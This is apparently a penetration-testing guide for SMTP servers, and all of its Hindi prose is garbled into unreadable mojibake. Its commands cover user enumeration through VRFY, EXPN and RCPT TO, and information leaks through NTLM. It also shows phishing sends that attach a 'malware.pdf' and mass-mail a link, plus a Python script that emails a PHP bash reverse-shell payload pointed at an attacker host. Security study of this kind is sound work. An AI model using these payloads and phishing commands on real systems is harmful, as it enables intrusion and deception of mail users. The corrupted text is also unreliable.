# 25,465,587 - SMTP/s рдХрд╛ рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдЕрдЧрд░ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди **HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>

<figure><img src="../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

**рд╕реБрд░рдХреНрд╖рд╛ рдЕрдиреБрдорд╛рдирди рдФрд░ рдкреЗрдиреЗрдЯреНрд░реЗрд╢рди рдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рддрддреНрдХрд╛рд▓ рдЙрдкрд▓рдмреНрдз рд╕реЗрдЯрдЕрдк**ред рдХрд╣реАрдВ рд╕реЗ рднреА 20+ рдЯреВрд▓ рдФрд░ рд╕реБрд╡рд┐рдзрд╛рдУрдВ рдХреЗ рд╕рд╛рде рдкреВрд░реНрдг рдкреЗрдирдЯреЗрд╕реНрдЯ рдЪрд▓рд╛рдПрдВ рдЬреЛ рдкреБрдирд░реАрдХреНрд╖рдг рд╕реЗ рд░рд┐рдкреЛрд░реНрдЯрд┐рдВрдЧ рддрдХ рдЬрд╛рддреЗ рд╣реИрдВред рд╣рдо рдкреЗрдирдЯреЗрд╕реНрдЯрд░реНрд╕ рдХреЛ рдмрджрд▓рдиреЗ рдирд╣реАрдВ рд╣реИрдВ - рд╣рдо рдЙрдиреНрд╣реЗрдВ рдХреБрдЫ рд╕рдордп рд╡рд╛рдкрд╕ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╕реНрдЯрдо рдЯреВрд▓, рдкрд╣рдЪрд╛рди рдФрд░ рд╢реЛрд╖рдг рдореЙрдбреНрдпреВрд▓ рд╡рд┐рдХрд╕рд┐рдд рдХрд░рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╡реЗ рдЧрд╣рд░рд╛рдИ рдореЗрдВ рдЦреЛрдЬ рдХрд░рдиреЗ, рд╢реИрд▓реНрд╕ рдкреЙрдк рдХрд░рдиреЗ рдФрд░ рдордЬрд╝рд╛ рдХрд░рдиреЗ рдореЗрдВ рд╕рдордп рдмрд┐рддрд╛ рд╕рдХреЗрдВред

{% embed url="https://pentest-tools.com/" %}

## **рдореМрд▓рд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**

**рд╕рд┐рдореНрдкрд▓ рдореЗрд▓ рдЯреНрд░рд╛рдВрд╕рдлрд░ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ (SMTP)** рдПрдХ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╣реИ рдЬреЛ **рдИ-рдореЗрд▓ рднреЗрдЬрдиреЗ рдФрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП TCP/IP рд╕реБрдЗрдЯ рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛ рдХреЗ рдЕрдВрдд рдореЗрдВ рд╕рдВрджреЗрд╢реЛрдВ рдХреА рдХрддрд╛рд░рдмрджреНрдзрддрд╛ рдореЗрдВ рдЗрд╕рдХреА рд╕реАрдорд╛рдУрдВ рдХреЗ рдХрд╛рд░рдг, SMTP рдХреЛ рдЕрдХреНрд╕рд░ **POP3 рдпрд╛ IMAP** рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпреЗ рдЕрддрд┐рд░рд┐рдХреНрдд рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд╕рдВрджреЗрд╢реЛрдВ рдХреЛ рд╕рд░реНрд╡рд░ рдореЗрд▓рдмреЙрдХреНрд╕ рдкрд░ рд╕рд╣реЗрдЬрдиреЗ рдФрд░ рдирд┐рдпрдорд┐рдд рдЕрдВрддрд░рд╛рд▓ рд╕реЗ рдЙрдиреНрд╣реЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХреА рд╕реБрд╡рд┐рдзрд╛ рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВред

рдЕрдорд▓ рдореЗрдВ, **рдИ-рдореЗрд▓ рдкреНрд░реЛрдЧреНрд░рд╛рдо** рдИ-рдореЗрд▓ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП **SMTP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ**, рдЬрдмрдХрд┐ **POP3 рдпрд╛ IMAP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ** рдЙрдиреНрд╣реЗрдВ рдкреНрд░рд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВред рдпреВрдирд┐рдХреНрд╕ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╕рд┐рд╕реНрдЯрдореЛрдВ рдкрд░, **sendmail** рдИ-рдореЗрд▓ рдХреЗ рдЙрджреНрджреЗрд╢реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рд╕рдмрд╕реЗ рдЕрдзрд┐рдХ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ SMTP рд╕рд░реНрд╡рд░ рд╣реИред рдПрдХ рд╡реНрдпрд╛рд╡рд╕рд╛рдпрд┐рдХ рдкреИрдХреЗрдЬ рдЬрд┐рд╕реЗ рд╕реЗрдВрдбрдореЗрд▓ рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ, рдПрдХ POP3 рд╕рд░реНрд╡рд░ рд╢рд╛рдорд┐рд▓ рдХрд░рддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, **рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рдПрдХреНрд╕рдЪреЗрдВрдЬ** рдПрдХ SMTP рд╕рд░реНрд╡рд░ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдФрд░ POP3 рд╕рдорд░реНрдерди рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХрд╛ рд╡рд┐рдХрд▓реНрдк рджреЗрддрд╛ рд╣реИред

**рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкреЛрд░реНрдЯ:** 25,465(ssl),587(ssl)
```
PORT   STATE SERVICE REASON  VERSION
25/tcp open  smtp    syn-ack Microsoft ESMTP 6.0.3790.3959
```
### рдИрдореЗрд▓ рд╣реЗрдбрд░реНрд╕

рдпрджрд┐ рдЖрдкрдХреЛ **рд╡рд┐рдХреНрдЯрд┐рдо рд╕реЗ рдПрдХ рдИрдореЗрд▓ рднреЗрдЬрдиреЗ рдХрд╛ рдореМрдХрд╛ рдорд┐рд▓реЗ** (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд░реВрдк рдореЗрдВ рд╡реЗрдм рдкреГрд╖реНрда рдХреЗ рд╕рдВрдкрд░реНрдХ рдлреЙрд░реНрдо рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ), рддреЛ рдРрд╕рд╛ рдХрд░реЗрдВ рдХреНрдпреЛрдВрдХрд┐ **рдЖрдк рдИрдореЗрд▓ рдХреЗ рд╣реЗрдбрд░реНрд╕ рджреЗрдЦрдХрд░ рд╡рд┐рдХреНрдЯрд┐рдо рдХреА рдЖрдВрддрд░рд┐рдХ рдЯреЛрдкреЛрд▓реЙрдЬреА рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рди рд╕рдХрддреЗ рд╣реИрдВред**

рдЖрдк рдПрдХ рдИрдореЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдПрдХ SMTP рд╕рд░реНрд╡рд░ рд╕реЗ рдЖ рд░рд╣рд╛ рд╣реИ рдЬреЛ рдХреЛрд╢рд┐рд╢ рдХрд░ рд░рд╣рд╛ рд╣реИ **рдЙрд╕ рд╕рд░реНрд╡рд░ рдХреЛ рдПрдХ рдЕрд╕реНрддрд┐рддреНрд╡ рдирд╣реАрдВ рд░рдЦрдиреЗ рд╡рд╛рд▓реЗ рдкрддреЗ рдкрд░ рдПрдХ рдИрдореЗрд▓ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП** (рдХреНрдпреЛрдВрдХрд┐ рд╕рд░реНрд╡рд░ рдЕрдЯреИрдХрд░ рдХреЛ рдПрдХ NDN рдИрдореЗрд▓ рднреЗрдЬреЗрдЧрд╛)ред рд▓реЗрдХрд┐рди, рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рдЖрдк рдПрдХ рдЕрдиреБрдорддрд┐ рдкреНрд░рд╛рдкреНрдд рдкрддреЗ рд╕реЗ рдИрдореЗрд▓ рднреЗрдЬрддреЗ рд╣реИрдВ (SPF рдиреАрддрд┐ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ) рдФрд░ рдЖрдк NDN рд╕рдВрджреЗрд╢ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЖрдкрдХреЛ рднреА **рд╡рд┐рднрд┐рдиреНрди рд╕рд╛рдордЧреНрд░реА рднреЗрдЬрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП рдХреНрдпреЛрдВрдХрд┐ рдЖрдк рд╣реЗрдбрд░реНрд╕ рдкрд░ рдФрд░ рднреА рджрд┐рд▓рдЪрд╕реНрдк рдЬрд╛рдирдХрд╛рд░реА** рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ: `X-Virus-Scanned: by av.domain.com`\
рдЖрдкрдХреЛ EICAR рдкрд░реАрдХреНрд╖рдг рдлрд╝рд╛рдЗрд▓ рднреЗрдЬрдиреА рдЪрд╛рд╣рд┐рдПред\
**AV** рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛ рдЖрдкрдХреЛ **рдЬреНрдЮрд╛рдд рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖реЛрдВ** рдХрд╛ рд╢реЛрдз рдХрд░рдиреЗ рдореЗрдВ рд╕рд╣рд╛рдпрддрд╛ рдкрд╣реБрдВрдЪрд╛ рд╕рдХрддрд╛ рд╣реИред

## рдореВрд▓ рдХреНрд░рд┐рдпрд╛рдПрдБ

### **рдмреИрдирд░ рдЧреНрд░рдмрд┐рдВрдЧ/рдореВрд▓ рдХрдиреЗрдХреНрд╢рди**

**SMTP:**
```bash
nc -vn <IP> 25
```
**SMTPS**:
```bash
openssl s_client -crlf -connect smtp.mailgun.org:465 #SSL/TLS without starttls command
openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587
```
### рдХрд┐рд╕реА рд╕рдВрдЧрдарди рдХреЗ рдПрдордПрдХреНрд╕ рд╕рд░реНрд╡рд░ рдЦреЛрдЬрдирд╛
```bash
dig +short mx google.com
```
### рдЬрд╛рдБрдЪ рдкрд░рд┐рдХреНрд╖рдг
```bash
nmap -p25 --script smtp-commands 10.10.10.10
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### NTLM рдкреНрд░рдорд╛рдгреАрдХрд░рдг - рд╕реВрдЪрдирд╛ рдлрд╛рд╕рд▓рд╛

рдпрджрд┐ рд╕рд░реНрд╡рд░ NTLM рдкреНрд░рдорд╛рдгреАрдХрд░рдг (Windows) рд╕рдорд░реНрдерд┐рдд рдХрд░рддрд╛ рд╣реИ, рддреЛ рдЖрдк рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА (рд╕рдВрд╕реНрдХрд░рдг) рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА [**рдпрд╣рд╛рдБ**](https://medium.com/@m8r0wn/internal-information-disclosure-using-hidden-ntlm-authentication-18de17675666)ред
```bash
root@kali: telnet example.com 587
220 example.com SMTP Server Banner
>> HELO
250 example.com Hello [x.x.x.x]
>> AUTH NTLM 334
NTLM supported
>> TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=
334 TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA
```
рдпрд╛ рдЗрд╕реЗ **nmap** рдкреНрд▓рдЧрдЗрди `smtp-ntlm-info.nse` рдХреЗ рд╕рд╛рде **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд** рдХрд░реЗрдВ

### рдЖрдВрддрд░рд┐рдХ рд╕рд░реНрд╡рд░ рдирд╛рдо - рд╕реВрдЪрдирд╛ рд▓реАрдХ

рдХреБрдЫ SMTP рд╕рд░реНрд╡рд░ рдПрдХ рдкреНрд░реЗрд╖рдХ рдХреЗ рдкрддреЗ рдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдкреВрд░рд╛ рдкрддрд╛ рди рджреЗрдиреЗ рдкрд░ рдСрдЯреЛ-рдкреВрд░реНрдг рдХрд░ рджреЗрддреЗ рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рдЗрд╕рдХрд╛ рдЖрдВрддрд░рд┐рдХ рдирд╛рдо рдЙрдЬрд╛рдЧрд░ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ:
```
220 somedomain.com Microsoft ESMTP MAIL Service, Version: Y.Y.Y.Y ready at  Wed, 15 Sep 2021 12:13:28 +0200
EHLO all
250-somedomain.com Hello [x.x.x.x]
250-TURN
250-SIZE 52428800
250-ETRN
250-PIPELINING
250-DSN
250-ENHANCEDSTATUSCODES
250-8bitmime
250-BINARYMIME
250-CHUNKING
250-VRFY
250 OK
MAIL FROM: me
250 2.1.0 me@PRODSERV01.somedomain.com....Sender OK
```
### рд╕реНрдирд┐рдлрд┐рдВрдЧ

рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк рдкреЛрд░реНрдЯ 25 рдкрд░ рдкреИрдХреЗрдЯ рд╕реЗ рдХреБрдЫ рдкрд╛рд╕рд╡рд░реНрдб рд╕реНрдирд┐рдл рдХрд░ рд░рд╣реЗ рд╣реИрдВ

### [рдСрде рдмреНрд░реВрдЯрдлреЛрд░реНрд╕](../../generic-methodologies-and-resources/brute-force.md#smtp)

## рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмреНрд░реВрдЯрдлреЛрд░реНрд╕ рдЧрдгрдирд╛

**рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╣рдореЗрд╢рд╛ рдЖрд╡рд╢реНрдпрдХ рдирд╣реАрдВ рд╣реИ** 

### RCPT TO
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
MAIL FROM:example@domain.com
250 2.1.0 example@domain.com... Sender ok
RCPT TO:test
550 5.1.1 test... User unknown
RCPT TO:admin
550 5.1.1 admin... User unknown
RCPT TO:ed
250 2.1.5 ed... Recipient ok
```
### VRFY

VRFY (Verify) рдХрдорд╛рдВрдб SMTP рд╕рд░реНрд╡рд░ рдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдореЛрдВ рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реЛрддрд╛ рд╣реИред рдпрд╣ рдПрдХ рдмрд╣реБрдд рд╣реА рдЕрджреНрд╡рд┐рддреАрдп рддрдХрдиреАрдХ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рд╕реА рднреА рдпреМрдЧрд┐рдХ рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдореЛрдВ рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
VRFY root
250 Super-User root@myhost
VRFY blah
550 blah... User unknown
```
### EXPN

### рдПрдХреНрд╕рдкреАрдПрди
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
EXPN test
550 5.1.1 test... User unknown
EXPN root
250 2.1.5 ed.williams@myhost
EXPN sshd
250 2.1.5 sshd privsep sshd@myhost
```
### рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЙрдкрдХрд░рдг
```
Metasploit: auxiliary/scanner/smtp/smtp_enum
smtp-user-enum: smtp-user-enum -M <MODE> -u <USER> -t <IP>
Nmap: nmap --script smtp-enum-users <IP>
```
<figure><img src="../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

**рд╕реБрд░рдХреНрд╖рд╛ рдореВрд▓реНрдпрд╛рдВрдХрди рдФрд░ рдкреЗрдиреЗрдЯреНрд░реЗрд╢рди рдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рддреБрд░рдВрдд рдЙрдкрд▓рдмреНрдз рд╕реЗрдЯрдЕрдк**ред 20+ рдЯреВрд▓ рдФрд░ рд╕реБрд╡рд┐рдзрд╛рдУрдВ рдХреЗ рд╕рд╛рде рдХрд╣реАрдВ рд╕реЗ рднреА рдкреВрд░реНрдг рдкреЗрдирдЯреЗрд╕реНрдЯ рдЪрд▓рд╛рдПрдВ рдЬреЛ рдкреБрдирд░реАрдХреНрд╖рдг рд╕реЗ рд░рд┐рдкреЛрд░реНрдЯрд┐рдВрдЧ рддрдХ рдЬрд╛рддреЗ рд╣реИрдВред рд╣рдо рдкреЗрдирдЯреЗрд╕реНрдЯрд░реНрд╕ рдХреЛ рдмрджрд▓рдиреЗ рдирд╣реАрдВ рджреЗрддреЗ - рд╣рдо рдЙрдиреНрд╣реЗрдВ рд╡рд╛рдкрд╕ рдХреБрдЫ рд╕рдордп рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╕реНрдЯрдо рдЯреВрд▓реНрд╕, рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдФрд░ рд╢реЛрдзрди рдореЙрдбреНрдпреВрд▓ рд╡рд┐рдХрд╕рд┐рдд рдХрд░рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╡реЗ рдЧрд╣рд░рд╛рдИ рдореЗрдВ рдЦреЛрдЬ рдХрд░ рд╕рдХреЗрдВ, рд╢реИрд▓реНрд╕ рдкреЙрдк рдХрд░ рд╕рдХреЗрдВ рдФрд░ рдордЬрд╝рд╛ рдХрд░ рд╕рдХреЗрдВред

{% embed url="https://pentest-tools.com/" %}

## DSN рд░рд┐рдкреЛрд░реНрдЯ

**рд╡рд┐рддрд░рдг рд╕реНрдерд┐рддрд┐ рд╕реВрдЪрдирд╛ рд░рд┐рдкреЛрд░реНрдЯ**: рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рд╕рдВрдЧрдарди рдХреЛ рдПрдХ **рдЕрдорд╛рдиреНрдп рдкрддреЗ** рдкрд░ рдПрдХ **рдИрдореЗрд▓** рднреЗрдЬрддреЗ рд╣реИрдВ, рддреЛ рд╕рдВрдЧрдарди рдЖрдкрдХреЛ рд╕реВрдЪрд┐рдд рдХрд░реЗрдЧрд╛ рдХрд┐ рдкрддрд╛ рдЕрдорд╛рдиреНрдп рдерд╛ рдФрд░ рдПрдХ **рдореЗрд▓ рдЖрдкрдХреЛ рд╡рд╛рдкрд╕ рднреЗрдЬреЗрдЧрд╛**ред рд╡рд╛рдкрд╕ рднреЗрдЬреЗ рдЧрдП рдИрдореЗрд▓ рдХреЗ **рд╣реЗрдбрд░** рдореЗрдВ рд╕рдВрднрд╛рд╡рд┐рдд **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА** рд╣реЛрдЧреА (рдЬреИрд╕реЗ рд░рд┐рдкреЛрд░реНрдЯреНрд╕ рдХреЗ рд╕рд╛рде рдЗрдВрдЯрд░реИрдХреНрдЯ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдореЗрд▓ рд╕реЗрд╡рд╛рдУрдВ рдХрд╛ рдЖрдИрдкреА рдкрддрд╛ рдпрд╛ рдПрдВрдЯреА-рд╡рд╛рдпрд░рд╕ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдЬрд╛рдирдХрд╛рд░реА)ред

## [рдХрдорд╛рдВрдб](smtp-commands.md)

### рд▓рд┐рдирдХреНрд╕ рдХрдВрд╕реЛрд▓ рд╕реЗ рдИрдореЗрд▓ рднреЗрдЬрдирд╛
```bash
sendEmail -t to@domain.com -f from@attacker.com -s <ip smtp> -u "Important subject" -a /tmp/malware.pdf
Reading message body from STDIN because the '-m' option was not used.
If you are manually typing in a message:
- First line must be received within 60 seconds.
- End manual input with a CTRL-D on its own line.

<phishing message>
```

```bash
swaks --to $(cat emails | tr '\n' ',' | less) --from test@sneakymailer.htb --header "Subject: test" --body "please click here http://10.10.14.42/" --server 10.10.10.197
```
### Python рдХреЗ рд╕рд╛рде рдИрдореЗрд▓ рднреЗрдЬрдирд╛

<details>

<summary>рдпрд╣рд╛рдБ рдкрд╛рдпрдерди рдХреЛрдб рд╣реИ</summary>
```python
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import sys

lhost = "127.0.0.1"
lport = 443
rhost = "192.168.1.1"
rport = 25 # 489,587

# create message object instance
msg = MIMEMultipart()

# setup the parameters of the message
password = ""
msg['From'] = "attacker@local"
msg['To'] = "victim@local"
msg['Subject'] = "This is not a drill!"

# payload
message = ("<?php system('bash -i >& /dev/tcp/%s/%d 0>&1'); ?>" % (lhost,lport))

print("[*] Payload is generated : %s" % message)

msg.attach(MIMEText(message, 'plain'))
server = smtplib.SMTP(host=rhost,port=rport)

if server.noop()[0] != 250:
print("[-]Connection Error")
exit()

server.starttls()

# Uncomment if log-in with authencation
# server.login(msg['From'], password)

server.sendmail(msg['From'], msg['To'], msg.as_string())
server.quit()

print("[***]successfully sent email to %s:" % (msg['To']))
```
</details>

## SMTP рднреЗрдЬрдирд╛

SMTP рднреЗрдЬрдирд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХреЛ рдЕрдирджреЗрдЦрд╛ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рдерд╛ (рд╕реБрд░рдХреНрд╖рд╛ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдЕрдЧрд▓реЗ рдЦрдВрдб рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ)ред SMTP рднреЗрдЬрдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ:

{% content-ref url="smtp-smuggling.md" %}
[smtp-smuggling.md](smtp-smuggling.md)
{% endcontent-ref %}

## рдореЗрд▓ рд╕реНрдкреВрдлрд┐рдВрдЧ рд╡рд┐рд░реЛрдзреА рдЙрдкрд╛рдп

рд╕рдВрдЧрдардиреЛрдВ рдХреЛ рдЕрдирдзрд┐рдХреГрдд рдИрдореЗрд▓ рднреЗрдЬрдиреЗ рд╕реЗ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП **SPF**, **DKIM**, рдФрд░ **DMARC** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ SMTP рд╕рдВрджреЗрд╢реЛрдВ рдХреЛ рд╕реНрдкреВрдл рдХрд░рдирд╛ рдЖрд╕рд╛рди рд╣реИред

рдЗрди рд╡рд┐рд░реЛрдзреА рдЙрдкрд╛рдпреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ **рдкреВрд░реНрдг рдорд╛рд░реНрдЧрджрд░реНрд╢рд┐рдХрд╛** [https://seanthegeek.net/459/demystifying-dmarc/](https://seanthegeek.net/459/demystifying-dmarc/) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВред

### SPF

{% hint style="danger" %}
SPF [2014 рдореЗрдВ "рд╡рд┐рдЪреНрдЫреЗрджрд┐рдд" рд╣реЛ рдЧрдпрд╛ рдерд╛](https://aws.amazon.com/premiumsupport/knowledge-center/route53-spf-record/)ред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЗрд╕рдХреЗ рдмрдЬрд╛рдп `_spf.domain.com` рдореЗрдВ **TXT рд░рд┐рдХреЙрд░реНрдб** рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдЗрд╕реЗ `domain.com` рдореЗрдВ рдмрдирд╛рддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ **рдПрдХ рд╣реА рд╡рд╛рдХреНрдп-рд░рдЪрдирд╛** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред\
рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдкрд┐рдЫрд▓реЗ spf рд░рд┐рдХреЙрд░реНрдб рдХреЛ рдкреБрдирдГ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХрд╛ рдХреБрдЫ рдРрд╕рд╛ рдорд┐рд▓рдирд╛ рд╕рд╛рдорд╛рдиреНрдп рд╣реИ `"v=spf1 include:_spf.google.com ~all"`
{% endhint %}

